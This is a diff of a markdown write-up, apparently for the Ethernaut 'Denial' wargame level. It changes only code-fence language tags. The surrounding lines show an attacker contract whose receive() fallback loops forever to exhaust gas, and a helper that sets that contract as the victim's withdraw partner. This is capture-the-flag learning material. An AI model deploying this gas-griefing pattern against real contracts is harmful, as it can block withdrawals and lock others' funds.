@@ -18,7 +18,7 @@ If a specific amount to spend had been set, execution would not halt and the `tr
 
 1. I coded and deployed (at: `0x5708A3c4d9472B9D6951200c6d6C2FB82ef96c50`) an attacker contract with a `receive()` fallback function defined as follows:
 
-```cs
+```js
 receive() external payable {
     while (true) {
         foreverLooping += 1;
@@ -29,7 +29,7 @@ receive() external payable {
 
 Where `foreverLooping` is a state variable:
 
-```cs
+```js
 uint256 private foreverLooping;
 ```
 
@@ -42,7 +42,7 @@ denialattack = DenialAttack.deploy(denial.address, _from)
 
 2. I made the contract `partner` through a function inside the contract I defined which calls `setWithdrawPartner()` in Denial through an interface:
 
-```cs
+```js
 function setThisAsWithdrawPartner() public {
     denialContract.setWithdrawPartner(address(this));
 }
